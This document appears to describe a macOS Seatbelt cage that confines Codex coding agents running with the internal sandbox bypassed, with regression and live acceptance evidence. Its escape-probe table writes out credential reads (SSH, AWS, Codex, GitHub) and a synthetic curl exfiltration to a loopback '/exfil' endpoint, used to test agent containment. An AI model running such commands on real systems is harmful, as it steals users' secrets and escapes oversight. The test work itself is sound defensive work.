# Codex external sandbox backend

This document records the external operating-system cage Firstmate applies to every Codex crewmate, scout, and secondmate launch.
`bin/fm-spawn.sh` owns the launch templates, `bin/fm-codex-cage.sh` owns validation and environment construction, and `bin/fm-codex-cage.sb` owns the macOS Seatbelt policy.

## Current posture

Both Codex launch templates run this shape:

```text
bin/fm-codex-cage.sh \
  --worktree <isolated-worktree> \
  --task-data-dir <firstmate-home>/data/<id> \
  --status-path <firstmate-home>/state/<id>.status \
  --notify-path <firstmate-home>/state/<id>.turn-ended \
  --fm-home <firstmate-home> \
  -- codex --dangerously-bypass-approvals-and-sandbox ...
```

The secondmate form omits `--notify-path` because its persistent lifecycle does not use the ordinary Codex turn-end notification.
The secondmate home is itself the isolated worktree, while its parent receives access only to the exact status path.
The former `--sandbox workspace-write --ask-for-approval never -c sandbox_workspace_write.network_access=true` interim is not present in either spawn path.

The Codex bypass flag is safe here only because the whole Codex process tree is already inside a fail-closed external Seatbelt cage.
The cage is a second layer, not a licence.
A passing probe set proves that the paths anticipated by those probes are blocked, but it cannot prove that no sandbox escape exists.
The rule that no agent ever touches the captain's personal browser is permanent and independent of this cage.
The browser rule is not relaxed by a passing cage test or by any autonomy posture.

## Cage boundary

The wrapper refuses to launch unless it is running on macOS with `sandbox-exec`, the profile, the public CA bundle, Command Line Tools, a genuine Git worktree, and a resolvable Codex native binary.
The environment is rebuilt from a non-secret allowlist rather than inherited from the captain's shell.
`DEVELOPER_DIR` is pinned to `/Library/Developer/CommandLineTools`, which is already readable inside the cage, so `xcrun` never needs the denied `/Applications/Xcode.app` tree.
`SSL_CERT_FILE` is pinned to `/private/etc/ssl/cert.pem`, and only the system TLS trust directory is opened for reads.

Seatbelt denies by default and then grants these task capabilities:

- System runtimes, developer tools, the Codex installation, the task worktree, its Git metadata, the exact task data directory, exact lifecycle files, and the cage's private temporary directory are readable.
- Only the discovered native Codex executable can read and write `CODEX_HOME`, so Codex can authenticate while model-launched shells cannot read its credential store.
- For a resolved rules file outside `CODEX_HOME`, that native process receives only exact-file read access, with no containing-directory or write grant.
- Interactive native Codex receives terminal-control ioctl access only to the exact controlling macOS PTY discovered at launch, while headless launches bind the inert `/dev/null` path and child processes receive no terminal ioctl allowance.
- Writes are limited to the task worktree, its Git metadata, `data/<id>`, the exact `state/<id>.status`, the exact turn-end file, and the cage's private temporary directory.
- Outbound internet access remains available for Codex and public Git operations.
- Every loopback TCP destination is denied, including already-running Chrome remote-debugging ports.
- Apple events, executable access below application bundles, LaunchServices, and account or credential brokers remain denied.
- A cage-local `gh` compatibility command supports only credential-free `gh repo clone OWNER/REPO`; authenticated GitHub CLI operations are rejected.

The profile deliberately denies `/Applications` and `/System/Applications`.
Do not open those trees to fix a tool lookup or browser compatibility issue.

## Kun posture and public-cage investigation

The investigation used `gh` CLI clones and local Git inspection rather than a browser.

- [`kunchenguid/firstmate` `bin/fm-spawn.sh` at commit `10ee7797e50c88c9865d8fb382cdfee5c2b8bcd1`](https://github.com/kunchenguid/firstmate/blob/10ee7797e50c88c9865d8fb382cdfee5c2b8bcd1/bin/fm-spawn.sh) launches both Codex forms with `--dangerously-bypass-approvals-and-sandbox`.
- The most recent public commit touching that file in the inspected history is [`3eca8ff0129792c97e933616f2d72ec5801679f1`](https://github.com/kunchenguid/firstmate/commit/3eca8ff0129792c97e933616f2d72ec5801679f1).
- [`kunchenguid/no-mistakes` `internal/agent/codex.go` at commit `88dc204f933bbccee5fd144f2fa1e74cb52704c2`](https://github.com/kunchenguid/no-mistakes/blob/88dc204f933bbccee5fd144f2fa1e74cb52704c2/internal/agent/codex.go) uses the same bypass default unless a caller provides sandbox flags.
- No fetchable cage implementation was present in Kun's inspected public Firstmate, no-mistakes, Treehouse, or dotfiles repositories.

Firstmate therefore matches Kun's public Codex posture and supplies the closest standard macOS implementation for the missing external layer: a deny-first `sandbox-exec` Seatbelt profile.

## Interactive launch regression evidence

- Date: 2026-07-29.
- Host: macOS 26.5.2.
- Codex: `codex-cli 0.145.0`.
- Affected base: merge commit `83acab5`.
- End-user path: `fm-spawn` launching an interactive Codex scout from a Treehouse worktree.
- Trigger: interactive Codex TUI initialization issued a `file-ioctl` against its controlling pseudo-terminal while the deny-first profile had no terminal ioctl allowance.
- Masking condition: the prior acceptance used headless `codex exec`, which does not require the TUI's terminal-control ioctl and therefore passed the full security probe set.
- Symptom: the TUI emitted its initial bracketed-paste control sequence, printed `Error: Operation not permitted (os error 1)`, and exited immediately.

The one-condition-at-a-time matrix found the earliest divergence at TUI startup rather than at the Treehouse path or any `fm-spawn` argument:

| Step | Single condition introduced | Result |
|---|---|---|
| A | Scratch Git directory plus `codex --version` | Exit 0, `codex-cli 0.145.0` |
| B | Replace the scratch directory with the real Treehouse worktree | Exit 0, so the Treehouse path alone was not the trigger |
| C | Replace `--version` with headless `codex exec` and no bypass or config overrides | Exit 0 and answered `CAGE_TREEHOUSE_OK` |
| D | Add `--dangerously-bypass-approvals-and-sandbox` to the headless launch | Exit 0 and answered `CAGE_BYPASS_OK` |
| E | Replace headless execution with the interactive TUI, retaining bypass but omitting notify, operational input, model, and effort overrides | Immediate operating-system denial in both the scratch directory and Treehouse worktree |
| F | Add only the notify hook to the passing headless launch | Exit 0, answered `CAGE_NOTIFY_OK`, and created the exact notification file |
| G | Add only the launch-brief operational-input argument to the passing headless launch | Exit 0 and answered `CAGE_OPINPUT_OK` |
| H | Add only the `gpt-5.6-sol` model and `high` effort overrides to the passing headless launch | Exit 0 and answered `CAGE_MODEL_OK` |

A temporary diagnostic profile changed one permission at a time under the native Codex process filter.
Allowing `/dev` reads alone retained the denial, allowing `/dev` writes alone retained the denial, and allowing `/dev` ioctls allowed the TUI to start.
The production fix does not retain that broad diagnostic scope.
The wrapper now discovers and validates only its controlling `/dev/ttys<alphanumeric>` character device, passes that exact path into Seatbelt, and the native-process filter grants `file-ioctl` only for that literal path.
A headless launch passes `/dev/null`, and the regression test proves a model-launched child process still receives an operating-system denial when it attempts the same terminal inspection.

The deterministic regression test uses macOS `expect` to allocate a real PTY and runs the real wrapper twice.
A fake `codex` symlink to `/bin/stty` proves the native executable can inspect only its controlling terminal, then a fake `codex` symlink to `/bin/zsh` proves its `/bin/stty` child cannot inherit the process-path-filtered ioctl allowance.
The focused result was:

```text
ok - only native Codex can inspect the exact controlling terminal while child processes remain denied
```

The final end-to-end check allocated a PTY from this real Treehouse Firstmate worktree and used the complete `fm-spawn` Codex argument shape: model `gpt-5.6-sol`, effort `high`, bypass mode, the notify hook against its separately bound task state path, and a launch brief encoded by `fm-operational-input.sh`.
The existing live acceptance separately retained the outside-worktree lifecycle-path checks for task status, report, and turn-end delivery.
The cage remained mandatory and the TUI's normal warnings for separately denied hooks and MCP startup paths were not opened by this fix.
The exact outcome summary was:

```text
turn-ended=true
answer-present=true
fatal-startup-denial=false
outcome=turn-ended
```

The answer reconstructed from the TUI output was `CAGE_TREEHOUSE_ANSWERED`.
This is equivalent to the real spawn because `/usr/bin/expect` supplied the same controlling PTY that a supported pane backend supplies, while every cage and Codex argument came from the production launch shape.

## Global-rules symlink regression evidence

- Date: 2026-07-29.
- Host: macOS 26.5.2.
- Codex: `codex-cli 0.145.0`.
- Vulnerable base: `20223234e9b61d6c5ecc8dcb373ffde988404531`.
- The initiating trigger was changing the discovered global-rules aliases from files below `CODEX_HOME` to symlinks whose resolved target was `~/.claude/CLAUDE.md`.
- The masking condition was either running without the external cage or pointing the same alias at a file below `CODEX_HOME`.
- The kernel-visible symptom was `Operation not permitted` when the native Codex process followed `~/.codex/AGENTS.md` to the external target.

The three aliases on the affected host had this exact topology:

```text
/Users/ackinvestment/AGENTS.md -> /Users/ackinvestment/.claude/CLAUDE.md
/Users/ackinvestment/.codex/AGENTS.md -> /Users/ackinvestment/.claude/CLAUDE.md
/Users/ackinvestment/.agents.md -> /Users/ackinvestment/.claude/CLAUDE.md
```

The deterministic reproduction created a synthetic home with `.codex/AGENTS.md -> ../.claude/CLAUDE.md` and ran this exact fixture and probe:

```sh
probe_root=$(mktemp -d "$PWD/.fm-cage-repro.XXXXXX")
home="$probe_root/home"
worktree="$probe_root/worktree"
mkdir -p "$home/.codex" "$home/.claude" "$worktree/.git" \
  "$probe_root/task-data" "$probe_root/cage-tmp"
printf 'SYNTHETIC_CANONICAL_RULES\n' >"$home/.claude/CLAUDE.md"
ln -s ../.claude/CLAUDE.md "$home/.codex/AGENTS.md"
printf 'uncaged='; /usr/bin/head -n 1 "$home/.codex/AGENTS.md"
run_probe() {
  /usr/bin/sandbox-exec -f bin/fm-codex-cage.sb \
    -D "WORKTREE=$worktree" \
    -D "GIT_DIR=$worktree/.git" \
    -D "GIT_COMMON_DIR=$worktree/.git" \
    -D "TASK_DATA_DIR=$probe_root/task-data" \
    -D "STATUS_PATH=$probe_root/status" \
    -D "NOTIFY_PATH=$probe_root/notify" \
    -D "CAGE_TMP=$probe_root/cage-tmp" \
    -D "CODEX_HOME=$home/.codex" \
    -D "TLS_TRUST_DIR=/private/etc/ssl" \
    -D "TTY_PATH=/dev/null" \
    -D "CODEX_NATIVE=/usr/bin/head" \
    -D "CODEX_INSTALL_ROOT=/usr/bin" \
    -D "LOCAL_BIN_DIR=/usr/bin" \
    -D "NPX_ROOT=/usr/bin" \
    -D "NO_MISTAKES_BIN_DIR=/usr/bin" \
    -D "NO_MISTAKES_SOCKET=/dev/null" \
    /usr/bin/head -n 1 "$1" 2>&1
}
set +e
denied=$(run_probe "$home/.codex/AGENTS.md")
denied_rc=$?
set -e
printf 'caged-external-target-exit=%s output=%s\n' "$denied_rc" "$denied"
```

The exact baseline output was:

```text
uncaged=SYNTHETIC_CANONICAL_RULES
caged-external-target-exit=1 output=head: /Users/ackinvestment/.treehouse/firstmate-3aecb2/2/firstmate/.fm-cage-repro.PlR5na/home/.codex/AGENTS.md: Operation not permitted
```

The smallest counterfactual changed only the symlink target to a file below the same synthetic `CODEX_HOME`.
Its exact output was:

```text
smallest-counterfactual-exit=0 output=SYNTHETIC_IN_HOME_RULES
```

That comparison identifies the earliest relevant denial as the resolved external target rather than the alias or Codex executable.
A current-base `codex exec` launch did not reproduce the previously reported immediate process exit.
It started successfully but emitted `warning: Failed to read global AGENTS.md instructions from /Users/ackinvestment/.codex/AGENTS.md: Operation not permitted (os error 1)`.
The earliest denial in that current Codex startup log was the `.agents/skills` directory, before the global-rules warning.
That denial remained after the fix while Codex started successfully, disproving it as the cause of the global-rules read failure.
The same launch also preserved disconfirming evidence that shell-snapshot validation and the project hooks configuration were denied independently, so those surfaces were not opened as part of this fix.

The wrapper now resolves only `~/AGENTS.md`, `$CODEX_HOME/AGENTS.md`, and `~/.agents.md`, requires every present alias to resolve to the same approved canonical file, and refuses broken, non-regular, unreadable, conflicting, or outside targets.
The Seatbelt profile grants only the native Codex executable read and existence checks for that exact resolved file.
For the affected external `~/.claude/CLAUDE.md` target, it does not grant the containing directory or write access, and model-launched child shells still receive an operating-system denial for the same file.

The focused verification commands were:

```sh
tests/fm-codex-cage.test.sh
FM_CODEX_CAGE_LIVE_E2E=1 tests/fm-codex-cage-live-e2e.test.sh
bin/fm-codex-cage.sh \
  --worktree "$PWD" \
  --task-data-dir /Users/ackinvestment/firstmate/data/fm-codex-cage-global-rules-symlink \
  --status-path /Users/ackinvestment/firstmate/state/fm-codex-cage-global-rules-symlink.status \
  --fm-home /Users/ackinvestment/firstmate \
  -- codex exec --ephemeral --skip-git-repo-check \
    --dangerously-bypass-approvals-and-sandbox 'Reply exactly CAGE_STARTED.'
```

The exact focused-test result was:

```text
ok - Seatbelt profile pins TLS trust, credential, browser, loopback, and broker boundaries
ok - wrapper rejects missing worktrees and relative lifecycle paths
ok - wrapper sanitizes the environment and binds only exact task paths
ok - wrapper refuses missing, unsafe, and conflicting global-rules targets
ok - only the native process reads the exact rules file while siblings and child shells remain denied
ok - only native Codex can inspect the exact controlling terminal while child processes remain denied
ok - public gh helper clones without credentials and rejects authenticated operations
ok - live harness prints evidence on both paths and preserves failed runs
ok - both Codex spawn templates require bypass mode inside the external cage
exit=0
```

The post-fix live launch returned `CAGE_STARTED`, exited `0`, and no longer emitted the global-rules warning.
The full acceptance run returned `ok - bypass-mode Codex is externally caged while task work, GitHub, main-home status/report delivery, and turn-end remain available` and exited `0`.
Its child-process evidence retained operating-system denials for the captain's SSH directory, configuration directory, shell startup file, synthetic AWS credential, Codex credential, and GitHub credential.
The unrelated skills, shell-snapshot, and project-hooks denials remained present, confirming the allowance did not broaden to those startup paths.

## Live acceptance evidence

- Date: 2026-07-24.
- Host: macOS 26.5.2.
- Codex: `codex-cli 0.145.0`.
- Git: `git version 2.50.1 (Apple Git-155)`.
- Ambient developer directory: `/Applications/Xcode.app/Contents/Developer`.
- Caged developer directory: `/Library/Developer/CommandLineTools`.

The exact acceptance invocation was:

```sh
FM_CODEX_CAGE_LIVE_E2E=1 tests/fm-codex-cage-live-e2e.test.sh
```

The live test launched `codex exec --dangerously-bypass-approvals-and-sandbox` through `bin/fm-codex-cage.sh`.
Its exact final output and exit were:

```text
ok - bypass-mode Codex is externally caged while task work, GitHub, main-home status/report delivery, and turn-end remain available
exit=0
```

### Escape probes

The generated probe script issued these commands from the model-launched shell:

| Probe | Command |
|---|---|
| Browser loopback | `/usr/bin/curl --connect-timeout 2 --fail --silent --show-error http://127.0.0.1:<live-port>/json/version` |
| SSH home | `/bin/ls "$HOME/.ssh"` |
| Config home | `/bin/ls "$HOME/.config"` |
| AWS home | `/usr/bin/head -c 1 <existing-synthetic-home>/.aws/credentials` |
| Shell startup | `/usr/bin/head -c 1 "$HOME/.zshrc"` |
| Codex credential | `/usr/bin/head -c 1 "$HOME/.codex/auth.json"` |
| GitHub credential | `/usr/bin/head -c 1 "$HOME/.config/gh/hosts.yml"` |
| Inherited secret | `/usr/bin/printenv FM_CAGE_TEST_SECRET` |
| Synthetic exfiltration | `head -c 1 <readable-worktree-sentinel> >/dev/null; printf 'payload-read-ok '; curl --data-binary @<readable-worktree-sentinel> http://127.0.0.1:<live-port>/exfil` |

Run 6 produced this exact probe evidence:

```text
browser-loopback  exit=7  refused, against a server proven live before AND after the run
home-ssh          exit=1  Operation not permitted
home-config       exit=1  Operation not permitted
home-aws          exit=1  Operation not permitted
home-shell-rc     exit=1  Operation not permitted
codex-credential  exit=1  Operation not permitted
gh-credential     exit=1  Operation not permitted
inherited-secret  exit=1  (empty)
synthetic-exfil   exit=7  payload-read-ok, then refused at the network layer
```

The AWS probe targeted an existing synthetic credential file, so its result was an operating-system denial rather than an absent-path error.
The exfiltration probe printed `payload-read-ok` before `curl`, proving the payload was readable before the network denial.
The synthetic browser endpoint returned `ready` before and after the cage run.
Its server log contained only the two external `/health` requests and no request from the caged process.

### Work controls

The generated probe script also issued these legitimate task commands:

| Control | Command |
|---|---|
| Worktree write | `printf cage-ok > worktree.txt && cat worktree.txt` |
| Shell pipeline | `printf 'alpha\nbeta\n' \| grep beta` |
| Public GitHub clone | `gh repo clone octocat/Hello-World gh-clone -- --depth=1 && test -d gh-clone/.git` |
| Main-home status | `printf 'working: cage acceptance\n' \| tee -a <firstmate-home>/state/cage-acceptance.status` |
| Main-home report | `printf '# Cage report\n\nDelivered from caged Codex.\n' \| tee <firstmate-home>/data/cage-acceptance/report.md` |

Run 6 produced this exact control evidence:

```text
worktree-write     exit=0  cage-ok
shell-pipeline     exit=0  beta
github-clone       exit=0  Cloning into 'gh-clone'...
main-status-write  exit=0  working: cage acceptance
main-report-write  exit=0  # Cage report  Delivered from caged Codex.
```

The turn-end notification file was also created.
The GitHub clone emitted harmless `xcrun` cache warnings because the cage does not grant the system temporary directory as a write path.

## Interim evidence and incident context

Before the external cage, the interim Codex `workspace-write` posture blocked off-worktree writes and browser launch but retained full-disk reads and access to already-listening loopback ports.
It also blocked legitimate `state/<id>.status` and `data/<id>/report.md` writes in the main Firstmate home, which broke scout report delivery.
Those residuals are why the interim was removed only after the external live acceptance passed.

The original incident came from conflating the captain-approved `+yolo` decision-autonomy posture with Codex's sandbox-bypass flag.
`+yolo` governs routine decision authority and never authorizes access to the captain's personal browser.
The current design keeps that distinction explicit: Codex bypasses only its internal sandbox, the external cage remains mandatory, and the browser rule remains permanent.
